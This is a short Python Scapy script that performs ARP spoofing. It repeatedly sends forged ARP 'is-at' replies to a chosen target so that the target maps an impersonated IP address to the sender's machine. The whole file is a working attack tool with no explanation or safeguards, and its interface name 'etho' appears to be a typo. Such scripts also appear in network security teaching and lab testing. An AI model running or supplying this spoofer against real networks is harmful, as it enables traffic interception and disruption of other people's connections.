#!/usr/bin/python

import sys
import time
from scapy.all import sendp, ARP, Ether

if len(sys.argv) < 3:
	print sys.argv[0] + ": <target> <spoof_ip>"
	sys.exit(1)

iface = "etho"
target = sys.argv[1]
fake = sys.argv[2]

eth = Ether()
arp = ARP(pdst=target,psrc=fake,op="is-at")
packet = eth/arp

while(1):
	sendp(packet,iface=iface)
	time.sleep(5)
